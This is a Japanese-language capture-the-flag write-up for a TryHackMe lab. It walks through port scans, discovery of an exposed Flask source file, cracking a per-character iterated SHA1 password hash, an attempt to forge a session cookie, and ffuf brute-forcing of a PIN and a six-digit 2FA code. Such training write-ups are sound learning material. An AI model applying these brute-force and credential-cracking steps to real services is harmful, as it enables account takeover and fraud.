# BreachBlocker Unlocker CTF

https://tryhackme.com/room/sq4-aoc2025-32LoZ4zePK

AOC2025のサイドクエスト。21337ポートで[シークレットキー](https://tryhackme.com/room/htapowershell-aoc2025-p2l5k8j1h4)を入力すると開始できる。

## Enumeration

```shell
TARGET=10.49.131.134
sudo bash -c "echo $TARGET   aoc >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE   REASON
22/tcp    open  ssh       syn-ack ttl 64
25/tcp    open  smtp      syn-ack ttl 63
8443/tcp  open  https-alt syn-ack ttl 63
21337/tcp open  unknown   syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,25,8443 $TARGET

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp     Postfix smtpd
8443/tcp open  ssl/http nginx 1.29.3
```

SSH ,SMTP, HTTPS

HTTPSは、スマホの画面。

### スマホの機能

1. HOPFLIX ログイン画面。メールアドレス入力済み。`sbreachblocker@easterbunnies.thm`
2. HOPSEC BANK ログイン画面。最終目標と思われる。
3. メール。一覧のみで詳細は表示できない。
4. フォト。3枚。
5. ブラウザ。`how to prevent ear hair from falling` を検索した後。
6. メッセージ。詳細表示可能。
7. 通話履歴。一覧表示のみ。
8. 認証アプリ。顔画像をスキャンしてエラーになる。
9. 設定。セキュリティのみ詳細表示可能。

### dirsearch

サーバーの秘密鍵が読めるので、何かあるとは思われる。

```
[03:10:48] 200 -   24KB - /main.js
[03:10:52] 200 -  890B  - /nginx.conf
[03:11:02] 200 -   44B  - /requirements.txt
[03:11:04] 200 -    1KB - /server.cert
[03:11:04] 200 -    2KB - /server.key
[03:11:16] 200 -   59B  - /uwsgi.ini
```

/requirements.txt

```
Flask==3.0.0
flask-cors==4.0.0
pycryptodome
```

### SMTP

メール送信できるが、スマホに反映されるわけでもなく意味が分からない。

```sh
$ nc $TARGET 25
220 hostname ESMTP Postfix (Debian)
HELO easterbunnies.thm
250 hostname
MAIL FROM:<sbreachblocker@easterbunnies.thm>
250 2.1.0 Ok
RCPT TO:<sbreachblocker@easterbunnies.thm>
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
hellohello
.
250 2.0.0 Ok: queued as 3F548FAA7F
QUIT
221 2.0.0 Bye
```

## フォト

binwalk, exiftool にかけたが何も出なかった。

## main.js

`const PHONE_PASSCODE = "210701";`

設定のセキュリティから2FAを解除できたが・・・

## メッセージ

HopFlixのパスワードはウサギにかかわるもの。


## HopFlix

パスワードブルートフォースが可能。

```http
POST /api/check-credentials HTTP/2
Host: 10.49.131.134:8443
Content-Length: 66
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua-Platform: "Linux"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://10.49.131.134:8443
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://10.49.131.134:8443/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8
Priority: u=1, i

{"email":"sbreachblocker@easterbunnies.thm","password":"emporium"}
```

```http
HTTP/2 200 OK
Server: nginx/1.29.3
Date: Mon, 22 Dec 2025 02:11:10 GMT
Content-Type: application/json
Content-Length: 45

{"error":"Incorrect Password","valid":false}
```

## bank

アカウントIDが数字だと仮定すると、有効なアカウントIDを割り出せる可能性がある。

```http
POST /api/bank-login HTTP/2
Host: 10.49.131.134:8443
Content-Length: 36
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua-Platform: "Linux"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://10.49.131.134:8443
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://10.49.131.134:8443/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8
Priority: u=1, i

{"account_id":"123456","pin":"0123"}
```

```http
HTTP/2 200 OK
Server: nginx/1.29.3
Date: Mon, 22 Dec 2025 03:34:07 GMT
Content-Type: application/json
Content-Length: 46

{"error":"User does not exist","valid":false}
```

## CODE_FLAG

main.py を発見。

```sh
root@ip-10-49-78-143:~# gobuster dir -q -x=pcap -u https://$TARGET:8443 -w ./dirlist.txt -t 64 -k
root@ip-10-49-78-143:~# gobuster dir -q -x=py,zip -u https://$TARGET:8443 -w ./dirlist.txt -t 64 -k
/main.py              (Status: 200) [Size: 6514]
```

フラグ1はコード上に隠れていた。

```py
from flask import Flask, request, jsonify, send_from_directory, session
import time
import random
import os
import hashlib
import time
import smtplib
import sqlite3
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

connection = sqlite3.connect("/hopflix-874297.db")
cursor = connection.cursor()

connection2 = sqlite3.connect("/hopsecbank-12312497.db")
cursor2 = connection2.cursor()

app = Flask(__name__)
app.secret_key = os.getenv('SECRETKEY')

aes_key = bytes(os.getenv('AESKEY'), "utf-8")

# Credentials (server-side only)
HOPFLIX_FLAG = os.getenv('HOPFLIX_FLAG')
BANK_ACCOUNT_ID = "hopper"
BANK_PIN = os.getenv('BANK_PIN')
BANK_FLAG = os.getenv('BANK_FLAG')
#CODE_FLAG = THM{[REDACTED]}

def encrypt(plaintext):
    cipher = AES.new(aes_key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode('utf-8'))
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode('utf-8')

def decrypt(encrypted_data):
    decoded_data = base64.b64decode(encrypted_data.encode('utf-8'))
    nonce_len = 16
    tag_len = 16
    nonce = decoded_data[:nonce_len]
    tag = decoded_data[nonce_len:nonce_len + tag_len]
    ciphertext = decoded_data[nonce_len + tag_len:]

    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    plaintext_bytes = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext_bytes.decode('utf-8')

def validate_email(email):
    if '@' not in email:
        return False
    if any(ord(ch) <= 32 or ord(ch) >=126 or ch in [',', ';'] for ch in email):
        return False

    return True

def send_otp_email(otp, to_addr):
    if not validate_email(to_addr):
        return -1

    allowed_emails= session['bank_allowed_emails']
    allowed_domains= session['bank_allowed_domains']
    domain = to_addr.split('@')[-1]
    if domain not in allowed_domains and to_addr not in allowed_emails:
        return -1

    from_addr = 'no-reply@hopsecbank.thm'
    message = f"""\
    Subject: Your OTP for HopsecBank

    Dear you,
    The OTP to access your banking app is {otp}.

    Thanks for trusting Hopsec Bank!"""

    s = smtplib.SMTP('smtp')
    s.sendmail(from_addr, to_addr, message)
    s.quit()


def hopper_hash(s):
    res = s
    for i in range(5000):
        res = hashlib.sha1(res.encode()).hexdigest()
    return res

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('.', path)

@app.route('/api/check-credentials', methods=['POST'])
def check_credentials():
    data = request.json
    email = str(data.get('email', ''))
    pwd = str(data.get('password', ''))
    
    rows = cursor.execute(
        "SELECT * FROM users WHERE email = ?",
        (email,),
    ).fetchall()

    if len(rows) != 1:
        return jsonify({'valid':False, 'error': 'User does not exist'})
    
    phash = rows[0][2]
    
    if len(pwd)*40 != len(phash):
        return jsonify({'valid':False, 'error':'Incorrect Password'})

    for ch in pwd:
        ch_hash = hopper_hash(ch)
        if ch_hash != phash[:40]:
            return jsonify({'valid':False, 'error':'Incorrect Password'})
        phash = phash[40:]
    
    session['authenticated'] = True
    session['username'] = email
    return jsonify({'valid': True})

@app.route('/api/get-last-viewed', methods=['GET'])
def get_bank_account_id():
    if not session.get('authenticated', False):
        return jsonify({'error': 'Unauthorized'}), 401
    return jsonify({'last_viewed': HOPFLIX_FLAG})

@app.route('/api/bank-login', methods=['POST'])
def bank_login():
    data = request.json
    account_id = str(data.get('account_id', ''))
    pin = str(data.get('pin', ''))
    
    # Check bank credentials
    rows = cursor2.execute(
        "SELECT * FROM users WHERE email = ?",
        (account_id,),
    ).fetchall()

    if len(rows) != 1:
        return jsonify({'valid':False, 'error': 'User does not exist'})
    
    phash = rows[0][2]
    if hashlib.sha256(pin.encode()).hexdigest().lower() == phash:
        session['bank_authenticated'] = True
        session['bank_2fa_verified'] = False
        session['bank_allowed_emails'] = rows[0][5].split(',')
        session['bank_allowed_domains'] = rows[0][6].split(',')
        
        if len(session['bank_allowed_emails']) > 0:
            return jsonify({
                'success': True,
                'requires_2fa': True,
                'trusted_emails': rows[0][5].split(','),
            })
        if len(session['bank_allowed_domains']) > 0:
            return jsonify({
                'success': True,
                'requires_2fa': True,
                'trusted_domains': rows[0][6].split(','),
            })
    else:
        return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/send-2fa', methods=['POST'])
def send_2fa():
    data = request.json
    otp_email = str(data.get('otp_email', ''))
    
    if not session.get('bank_authenticated', False):
        return jsonify({'error': 'Access denied.'}), 403
    
    # Generate 2FA code
    two_fa_code = ''.join([str(random.randint(0, 9)) for _ in range(6)])
    session['bank_2fa_code'] = encrypt(two_fa_code)

    if send_otp_email(two_fa_code, otp_email) != -1:
        return jsonify({'success': True})
    else:
        return jsonify({'success': False})

@app.route('/api/verify-2fa', methods=['POST'])
def verify_2fa():
    data = request.json
    code = str(data.get('code', ''))
    
    if not session.get('bank_authenticated', False):
        return jsonify({'error': 'Access denied.'}), 403
    
    if not session.get('bank_2fa_code', False):
        return jsonify({'error': 'No 2FA code generated'}), 404
    
    if code == decrypt(session.get('bank_2fa_code')):
        session['bank_2fa_verified'] = True
        return jsonify({'success': True})
    else:
        if 'bank_2fa_code' in session:
            del session['bank_2fa_code']
        return jsonify({'error': 'Invalid code'}), 401

@app.route('/api/release-funds', methods=['POST'])
def release_funds():
    if not session.get('bank_authenticated', False):
        return jsonify({'error': 'Access denied.'}), 403
    if not session.get('bank_2fa_verified', False):
        return jsonify({'error': 'Access denied.'}), 403
    
    return jsonify({'flag': BANK_FLAG})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True,threaded=True)
```

## HOPFLIX_FLAG

"/hopflix-874297.db" からhopflixのパスワードハッシュを取得。  
パスワード1文字につきハッシュ40文字になるので、パスワードは12文字とわかる。  
ハッシュと文字の対比表を作る。

```python
import hashlib
import string

def hopper_hash(s):
    res = s
    for i in range(5000):
        res = hashlib.sha1(res.encode()).hexdigest()
    return res

# ASCII印字可能文字（space ～ ~）
printable_chars = [chr(i) for i in range(0x20, 0x7F)]

for c in printable_chars:
    h = hopper_hash(c)
    print(f"{repr(c)} -> {h}")
```

一致しないのでループ回数を調整した結果、実際に使用されている回数が判明。  
ハッシュと対比表からパスワードを復元できた。

## BANK_FLAG

ソースコードから、アカウント名はメールアドレスと判明。  
返ってきたエラーコードから、同じメールアドレスが有効と確認。

/hopsecbank-12312497.db は存在しない。  
ファジングしたがヒットしなかった。（途中でVMがダウンした）

```sh
root@ip-10-48-77-181:~# seq 10000000 20000000 > nums.txt
root@ip-10-48-77-181:~# ffuf -u https://10.48.148.131:8443/hopsecbank-FUZZ.db -w ./nums.txt -fc 404
```

もしFlaskの秘密鍵を入手できたら、セッション変数を自由に変更できるので一発で解決する。

server.key をシークレットとしてセッションクッキーを生成してみたが駄目だった。  
Base64文字列部分をバイナリにしたりいろいろなパターンを試したが駄目だった。

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

class FakeApp:
    #secret_key = b"secret_key_417759"
    config = {
        "SECRET_KEY_FALLBACKS": []
    }

app = FakeApp()
with open('server.key', 'r') as f:
    app.secret_key = f.read().replace('\n', '').replace('\r', '')

serializer = SecureCookieSessionInterface().get_signing_serializer(app)

cookie = serializer.dumps({
    "bank_authenticated": True,
    "bank_2fa_verified": True,
    #"bank_allowed_emails": "",
    #"bank_allowed_domains": "",
})

print(cookie)
```

```sh
$ curl https://10.48.148.131:8443/api/release-funds -X POST -H "Cookie: session=.eJyrVkp[REDACTED]" --insecure 
{"error":"Access denied."}
```

Flask秘密鍵はあきらめて、BankのPINを攻撃する。

4桁から6桁の数字でPINをブルートフォースしたが、ヒットしなかった。

```sh
ffuf -u https://10.48.191.66:8443/api/bank-login -X POST -d '{"account_id":"sbreachblocker@easterbunnies.thm","pin":"FUZZ"}' -w ./pin6.txt -H "Cookie: session=eyJhdX[REDACTED]" -fr 'Invalid credentials'

ffuf -u https://10.48.191.66:8443/api/bank-login -X POST -d '{"account_id":"sbreachblocker@easterbunnies.thm","pin":"FUZZ"}' -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt -H "Cookie: session=eyJhd[REDACTED]" -fr 'Invalid credentials'
```

HopFlipと同じパスワードでログインできた・・・

## 2FA

入力画面は数字6桁なので、6桁ファジングで発見できるはず。

```sh
root@ip-10-48-101-53:~# ffuf -u https://10.48.163.127:8443/api/verify-2fa -X POST -H "Cookie: session=.eJxtj[REDACTED]" -H "Content-Type: application/json" -d '{"code": "FUZZ"}' -w /usr/share/wordlists/SecLists/Fuzzing/6-digits-000000-999999.txt -fr 'Invalid code'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : https://10.48.163.127:8443/api/verify-2fa
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Fuzzing/6-digits-000000-999999.txt
 :: Header           : Cookie: session=.eJxtj[REDACTED]
 :: Header           : Content-Type: application/json
 :: Data             : {"code": "FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Regexp: Invalid code
________________________________________________

[REDACTED]                  [Status: 200, Size: 17, Words: 1, Lines: 2]
:: Progress: [1000000/1000000] :: Job [1/1] :: 895 req/sec :: Duration: [0:21:43] :: Errors: 0 ::
```

ヒット！

画面で入力して先に進むと最後のフラグが表示された。

## 振り返り

- AOC のサイドクエストを初めてボーナス期間中にクリアできた。
- 25ポートと server.key には最後まで惑わされた。
- 最後の6桁のOTPは、たぶん実際は大きな数字が出るように操作されていた気がするので、逆順のリストを作った方がCTF的に速かったかもしれない。

## Tags

#tags:puzzle #tags:ブルートフォース #tags:Flask
